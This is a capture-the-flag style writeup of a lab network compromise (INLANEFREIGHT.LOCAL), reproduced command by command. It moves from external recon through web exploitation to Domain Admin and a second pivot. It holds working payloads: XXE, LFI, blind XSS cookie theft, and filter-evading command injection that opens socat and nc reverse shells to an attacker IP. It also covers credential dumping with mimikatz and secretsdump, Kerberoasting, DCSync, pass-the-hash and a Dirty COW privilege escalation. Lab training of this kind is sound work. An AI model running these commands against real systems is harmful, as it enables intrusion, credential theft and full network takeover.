# Attacking Enterprise Networks (AEN) — Full Writeup

> Technical walkthrough of the full external-to-internal compromise of INLANEFREIGHT.LOCAL.
> Command-by-command reproduction notes. Companion to the professional report.

**Scope**

| External | Internal |
| --- | --- |
| `10.129.86.240` | `172.16.8.0/23` |
| `*.inlanefreight.local` | `172.16.9.0/23` |
| | `INLANEFREIGHT.LOCAL` (AD domain) |

---

## 1. External Enumeration

### 1.1 Initial port scan

```bash
nmap -p- --open -sV -oA inlanefreight_ept_tcp_all_svc 10.129.86.240
```

Key services identified:

| Port | Service | Version | Notes |
| --- | --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 | Anonymous login |
| 22 | SSH | OpenSSH 8.2p1 | |
| 25 | SMTP | Postfix smtpd | VRFY enabled |
| 53 | DNS | banner: `1337_HTB_DNS` | AXFR allowed |
| 80 | HTTP | Apache 2.4.41 | "Inlanefreight" |
| 110/143/993/995 | POP3/IMAP(S) | Dovecot | |
| 111 | RPCBind | 2-4 | restricted |
| 8080 | HTTP | Apache 2.4.41 | "Support Center" |

Quick service-frequency triage from the greppable output:

```bash
egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap \
  | cut -d ' ' -f4- | tr ',' '\n' | sed -e 's/^[ \t]*//' \
  | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c | sort -k 1 -nr
```

### 1.2 DNS zone transfer

```bash
dig axfr inlanefreight.local @10.129.86.240
```

The zone transfer succeeded and disclosed 11 subdomains (all pointing to `127.0.0.1`, i.e. virtual hosts on the web server): `blog`, `careers`, `dev`, `gitlab`, `ir`, `status`, `support`, `tracking`, `vpn`, plus a `flag` TXT record. Added all to `/etc/hosts`.

### 1.3 Virtual host enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://10.129.86.240/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
```

Confirmed live vhosts including `support`, `vpn`, `status`, `monitoring`, `dev`, `careers`, `blog`, `tracking`, `ir`, `gitlab`. Note `monitoring` was **not** in the zone transfer — found only via fuzzing.

### 1.4 Non-web service checks

**FTP** — anonymous login worked but granted no read/write of interest:

```bash
ftp 10.129.86.240   # anonymous / <blank>
```

**SMTP VRFY user enumeration:**

```bash
telnet 10.129.86.240 25
VRFY root      # 252 -> exists
VRFY lol       # 550 -> does not exist
```

**POP3** — plaintext auth disallowed on non-TLS, enumeration not viable here:

```bash
telnet 10.129.86.240 110
USER root      # -ERR Plaintext authentication disallowed
```

**RPC** — exposed but restricted, no useful data:

```bash
rpcinfo 10.129.86.240
```

### 1.5 Screenshot the web estate

```bash
eyewitness --web -f hosts.txt        # or per-vhost URLs
```

---

## 2. External Application Exploitation

### 2.1 blog.inlanefreight.local — Drupal (no path)

```bash
curl -s http://blog.inlanefreight.local | grep Drupal
# Drupal 9 — recent, no usable known exploit; weak creds & registration failed
```

Moved on.

### 2.2 careers.inlanefreight.local — IDOR

Registered an account, then observed the profile URL:

```
http://careers.inlanefreight.local/profile?id=9
```

Incrementing `id` exposed other users' private data → **IDOR**. Automated enumeration of the flag with Burp Intruder: intercept the request, send to Intruder, set payload on `id`, numeric range 1–100, grep-match on `HTB`. ID 4 returned the flag.

### 2.3 dev.inlanefreight.local — Upload filter bypass → RCE

Directory enumeration:

```bash
gobuster dir -u http://dev.inlanefreight.local \
  -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```

Found `/upload.php` but it returned access-denied. Enumerating supported HTTP methods showed the `TRACK` method returned an `X-Custom-IP-Authorization` header. Bypass chain:

1. Use `TRACK` with header `X-Custom-IP-Authorization: 127.0.0.1` → the "Pixel Shop" upload form became visible.
2. Client-side restriction allowed only gif/png/jpeg. Bypassed by setting `Content-Type: image/png` on the PHP shell upload.
3. Shell uploaded → RCE as `www-data`:

```bash
curl "http://dev.inlanefreight.local/uploads/shell.php?cmd=id"
curl "http://dev.inlanefreight.local/uploads/shell.php?cmd=cat%20/var/www/html/flag.txt"
```

### 2.4 ir.inlanefreight.local — WordPress LFI + weak creds

```bash
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
```

Recent WP core, but the **Mail Masta** plugin is present → LFI via `include($_GET['pl'])`:

```bash
curl -s "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
curl -s "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt"
```

WPScan enumerated users (`ilfreightwp`, `tom`, `james`, `john`). Password-guessing:

```bash
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
```

Recovered valid creds → logged in → **Appearance > Theme Editor** → edited a theme PHP file with a web shell → RCE.

### 2.5 status.inlanefreight.local — SQL Injection

A single quote in `searchitem` triggered a MySQL error. Confirmed manually with UNION (extracting DB name, user, version), then automated with sqlmap:

```bash
sqlmap -r sqli.txt --dbms=mysql -D status --tables
```

Enumerated the `status` database (`users`, `company` tables). Confirmed vectors: boolean-blind, error-based, time-based, UNION.

### 2.6 support.inlanefreight.local — Blind XSS → session hijack

Blind stored XSS in the `Message` field of `/ticket.php`. Setup:

```bash
# listener for the callback
nc -lvnp 9000
# PHP server hosting the payload
php -S 0.0.0.0:9200
```

`script.js` exfiltrated the admin session cookie via an `Image` src request to the listener. Submitted a ticket with a payload pointing at `script.js`. When the admin viewed the ticket, the callback delivered:

```
session=fcfaf93ab169bc943b92109f0a845d99
```

Imported the cookie with the Cookie-Editor extension → authenticated as admin → dashboard → flag (user John).

### 2.7 tracking.inlanefreight.local — HTML injection → SSRF

The PDF-generation search field rendered unsanitized HTML. Escalated to file read via an iframe pointing at a local file:

```html
<iframe src="file:///flag.txt"></iframe>
```

The generated PDF contained the file contents → **SSRF / local file read**.

### 2.8 gitlab.inlanefreight.local — Misconfig → new subdomain

Registered an account. Version via `/help` → 15.0.0 (recent). Browsing projects disclosed a reference to a new subdomain: `shopdev2.inlanefreight.local`. Added to `/etc/hosts`.

### 2.9 shopdev2.inlanefreight.local — XXE

Logged in with `admin:admin`. Intercepting the shop checkout POST revealed an XML body:

```xml
<?xml version="1.0" encoding="UTF-8"?><root><subtotal>undefined</subtotal><userid>1206</userid></root>
```

XXE payload that worked:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [ <!ENTITY xxetest SYSTEM "file:///etc/passwd"> ]>
<root>
  <subtotal>undefined</subtotal>
  <userid>&xxetest;</userid>
</root>
```

Swapped `/etc/passwd` for `flag.txt` to read the flag.

### 2.10 monitoring.inlanefreight.local — Command injection → foothold

Login panel brute-forced:

```bash
hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form ...
# admin:12qwaszx
```

Authenticated shell was limited. The `connection_test` (ping) feature, intercepted in Burp, was injectable. Flag read:

```bash
curl -s "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0Ac'a't%0900112233_flag.txt"
```

**Reverse shell** for initial internal access. Listener on Kali:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:8443
```

Triggered via the injectable parameter (URL-encoded, `${IFS}` for spaces, quotes to evade filtering):

```bash
curl -v "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a's'o'c'a't'%24%7BIFS%7DTCP4%3A10.10.15.2%3A8443%24%7BIFS%7DEXEC%3Abash"
```

Got a shell as `webdev` on **dmz01**.

---

## 3. Foothold & Local PrivEsc on dmz01

### 3.1 Stabilize the shell

```bash
# Kali listener
socat file:`tty`,raw,echo=0 tcp-listen:4443
# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.2:4443
```

### 3.2 Recover srvadm creds from audit logs

```bash
id       # uid=1004(webdev) groups=1004(webdev),4(adm)
aureport --tty | less
```

The TTY report showed cleartext input including `su ILFreightnixadm!` and `sudo su srvadm`. Switched user:

```bash
su srvadm      # ILFreightnixadm!
# flag in srvadm home
```

### 3.3 sudo openssl → root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/openssl
```

GTFOBins: `openssl enc` reads arbitrary files. Read root's SSH key:

```bash
sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa
```

Saved the key locally, then:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.129.87.19       # root on dmz01
```

---

## 4. Pivot into 172.16.8.0/23

### 4.1 Host discovery from dmz01

```bash
# simple sweep from the foothold
for i in $(seq 1 254); do ping -c1 -W1 172.16.8.$i &>/dev/null && echo "172.16.8.$i UP"; done
```

Live: `172.16.8.3`, `172.16.8.20`, `172.16.8.50`, `172.16.8.120`.

### 4.2 Internal port scan (static nmap)

proxychains was unreliable, so a static nmap binary was transferred via `scp` and run from the target:

```bash
/tmp/nmap_correct --open -iL /tmp/live_hosts \
  -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,5985,5986,6379,8080,8443
```

Results:

- **172.16.8.3** → DC01 (53, 88, 135, 139, 389, 445, 464, 593, 636)
- **172.16.8.20** → DEV01 (80, 111, 135, 139, 445, **2049 NFS**, 3389)
- **172.16.8.50** → MS01 (135, 139, 445, 3389, 8080)

---

## 5. DEV01 (172.16.8.20)

### 5.1 NFS mount via SSH tunnel

proxychains mount was unreliable, so a dedicated tunnel was built through dmz01:

```bash
ssh -i ~/id_rsa -L 2049:172.16.8.20:2049 -L 111:172.16.8.20:111 -N -f root@10.129.229.147

sudo mkdir -p /tmp/nfs_mount
sudo mount -t nfs -o nolock localhost:/DEV01 /tmp/nfs_mount
ls -la /tmp/nfs_mount
```

The share held a DNN `web.config` with cleartext creds:

```
Administrator : D0tn31Nuk3R0ck$$@123
```

### 5.2 DotNetNuke → xp_cmdshell → SYSTEM

Logged into DNN as `Administrator`, used the SQL console to enable `xp_cmdshell` → RCE on DEV01. Uploaded `PrintSpoofer64.exe` and `nc.exe` via the File Manager, then:

```cmd
PrintSpoofer64.exe -c "nc.exe 10.10.15.2 443 -e cmd"
```

→ `NT AUTHORITY\SYSTEM`.

### 5.3 Dump local hashes

```cmd
reg save HKLM\SAM SAM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
```

```bash
secretsdump.py -sam SAM.SAVE -system SYSTEM.SAVE -security SECURITY.SAVE LOCAL
# recovered local accounts incl. hporter (Gr8hambino!)
```

Flag in `C:\Users\Administrator\Desktop\flag.txt`. RDP'd in as the domain user `hporter`.

---

## 6. Active Directory Enumeration & Lateral Movement

### 6.1 BloodHound collection as hporter

Via RDP (minimal cmd). Pulled SharpHound from the mounted TSCLIENT share:

```cmd
cp \\TSCLIENT\share\SharpHound.exe .
.\SharpHound.exe -c All --zipfilename ILFREIGHT
cp .\*_ILFREIGHT.zip \\TSCLIENT\share\
```

Analyzed in BloodHound on Kali.

### 6.2 ForceChangePassword → SSMALLS

hporter → **ForceChangePassword** on SSMALLS:

```powershell
Import-Module .\PowerView.ps1
$NewPassword = ConvertTo-SecureString 'NuovaPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'SSMALLS' -AccountPassword $NewPassword
```

Enumerated DC shares as SSMALLS:

```bash
proxychains crackmapexec smb 172.16.8.3 -u SSMALLS -p 'NuovaPassword123!' --shares
```

`Department Shares` was readable. Pulled a SQL backup script from `IT/Private/`:

```bash
smbclient //172.16.8.3/'Department Shares' -U SSMALLS
# get backup.ps1
```

`backup.ps1` contained:

```
backupadm : !qazXSW@
```

### 6.3 Kerberoasting (backupjob)

RDP'd to DEV01 as backupadm, pulled Rubeus from the share:

```powershell
.\Rubeus.exe kerberoast /nowrap
```

Cracked the `backupjob` ticket:

```bash
hashcat -m 13100 -a 0 hashbackup.txt /usr/share/wordlists/rockyou.txt
# backupjob : lucky7
```

### 6.4 unattend.xml on MS01 (172.16.8.50)

```bash
proxychains evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

```powershell
type C:\panther\unattend.xml
# AutoLogon: ilfserveradm : Sys26Admin
```

### 6.5 Sysax Automation privesc on MS01 → local admin

```bash
proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /drive:share,/home/kali/share
```

Created `pwn.bat` in `C:\Users\ilfserveradm\Documents`:

```cmd
net localgroup administrators ilfserveradm /add
```

Configured `sysaxschedscp.exe` to run the batch as **SYSTEM** (deselecting "Login as the following user"), triggered by dropping a `.txt` file in the folder. Reconnected → local admin.

### 6.6 LLMNR/NBT-NS/mDNS poisoning (Inveigh)

On MS01:

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -SpooferHostsReply Y -ConsoleOutput Y
```

Captured `mpalledorous` NetNTLM hash → cracked:

```bash
hashcat -m 5600 mpalledorous.txt /usr/share/wordlists/rockyou.txt
# mpalledorous : 1squints2
```

### 6.7 Mimikatz — LSA secrets

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets
# DefaultPassword -> mssqladm : DBAilfreight1!
# also $MACHINE.ACC dumped
```

---

## 7. Domain Compromise

### 7.1 Targeted Kerberoasting (mssqladm GenericWrite → ttimmons)

BloodHound: mssqladm → **GenericWrite** on ttimmons. Abuse (set temp SPN, roast, clean up) automated:

```bash
proxychains python3 targetedKerberoast.py -d INLANEFREIGHT.LOCAL \
  -u mssqladm -p DBAilfreight1! --dc-ip 172.16.8.3 \
  --request-user ttimmons -o ttimmons_hash.txt

hashcat -m 13100 ttimmons_hash.txt /usr/share/wordlists/rockyou.txt
# ttimmons : Repeat09
```

### 7.2 GenericAll on Server Admins → group membership

ttimmons → **GenericAll** on the `Server Admins` group:

```powershell
Import-Module .\PowerView.ps1
Add-DomainGroupMember -Identity 'Server Admins' -Members 'ttimmons'
```

Refresh the token:

```cmd
klist purge
runas /user:INLANEFREIGHT\ttimmons cmd
whoami /groups   # confirms INLANEFREIGHT\Server Admins
```

### 7.3 DCSync

Server Admins holds replication rights → DCSync:

```bash
proxychains impacket-secretsdump -just-dc-ntlm INLANEFREIGHT.LOCAL/ttimmons:'Repeat09'@172.16.8.3
# Administrator:500:...:fd1f7e5564060258ea787ddbb6e6afa2:::
```

### 7.4 Domain Admin access

```bash
proxychains evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e5564060258ea787ddbb6e6afa2
# flag on Administrator Desktop
```

---

## 8. Pivot to the Management Network (172.16.9.0/23)

### 8.1 Loot on the DC

SSH private keys in a departmental share:

```
C:\Department Shares\it\Private\Networking\
  harry-id_rsa
  james-id_rsa
  ssmallsadm-id_rsa
```

New network discovered:

```cmd
ipconfig /all      # reveals 172.16.9.3
```

Ping sweep:

```powershell
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
# 172.16.9.25 UP  (MGMT01)
```

### 8.2 Double pivot with Ligolo-ng

Goal: `Kali → dmz01 → DC01 → MGMT01`.

**Setup on Kali:**

```bash
mkdir ~/ligolo && cd ~/ligolo
# download proxy + linux/windows agents (v0.6.2), extract, chmod +x
sudo ./proxy -selfcert
```

**Hop 1 (Kali → dmz01):**

```bash
scp -i id_rsa ~/ligolo/agent root@<dmz01>:/tmp/
ssh -i id_rsa root@<dmz01>
# on dmz01:
cd /tmp && chmod +x agent && ./agent -connect 10.10.15.2:11601 -ignore-cert
```

In the Ligolo console:

```
session            # select 1 (dmz01)
interface_create --name ligolo
tunnel_start --tun ligolo
```

Route on Kali:

```bash
sudo ip route add 172.16.8.0/24 dev ligolo
ping -c3 172.16.8.3   # DC reachable
```

**Hop 2 (dmz01 → DC01):** add a listener on the dmz01 session:

```
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
```

Upload and run the Windows agent on DC01 (via evil-winrm as Administrator):

```bash
evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e5564060258ea787ddbb6e6afa2
# upload /home/kali/ligolo/agent.exe
```

```powershell
.\agent.exe -connect 172.16.8.120:4444 -ignore-cert
```

In the Ligolo console:

```
session            # select 2 (DC01)
interface_create --name ligolo2
tunnel_start --tun ligolo2
```

Second route:

```bash
sudo ip route add 172.16.9.0/23 dev ligolo2
ping -c3 172.16.9.25   # MGMT01 reachable
```

### 8.3 Access MGMT01 via reused SSH key

Download the key from the DC and connect:

```bash
# via evil-winrm: download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa"
chmod 600 ssmallsadm-id_rsa
ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
# flag on desktop (non-root)
```

### 8.4 Dirty COW → root

```bash
uname -r    # 5.10.0-...-generic -> vulnerable to Dirty COW (CVE-2016-5195)
# transfer exploit-2.c via scp
gcc exploit-2.c -o exploit-2
chmod +x exploit-2
./exploit-2 /usr/bin/sudo
# root shell -> flag in /root
```

---

## 9. Compromise Summary

| Stage | Technique | Result |
| --- | --- | --- |
| External recon | DNS AXFR + vhost fuzzing | 12 web apps mapped |
| Web exploitation | IDOR, upload bypass, LFI, SQLi, XSS, SSRF, XXE, cmd injection | multiple RCE/data access |
| Initial foothold | Command injection (monitoring) | shell on dmz01 (webdev) |
| Linux privesc | audit-log creds → sudo openssl (GTFOBins) | root on dmz01 |
| Pivot 1 | SSH tunnels / static nmap | 172.16.8.0/23 |
| DEV01 | NFS creds → DNN xp_cmdshell → PrintSpoofer | SYSTEM + SAM dump |
| AD lateral movement | ForceChangePassword, cleartext creds, Kerberoast, Sysax, Inveigh, Mimikatz | multiple domain accounts |
| Domain compromise | GenericWrite → targeted Kerberoast → GenericAll → DCSync | Domain Admin |
| Pivot 2 | Ligolo-ng double pivot + reused SSH key | 172.16.9.0/23 (MGMT01) |
| Final privesc | Dirty COW (CVE-2016-5195) | root on MGMT01 |

---

## 10. Tooling Reference

`nmap` · `ffuf` · `gobuster` · `dig` · `wpscan` · `sqlmap` · `hydra` · `burpsuite` · `eyewitness` · `curl` · `netcat` · `socat` · `crackmapexec` · `smbclient` · `evil-winrm` · `xfreerdp` · `impacket (secretsdump, targetedKerberoast)` · `Rubeus` · `PowerView` · `SharpHound` / `BloodHound` · `Inveigh` · `mimikatz` · `PrintSpoofer` · `Ligolo-ng` · `hashcat`

---

*End of writeup.*
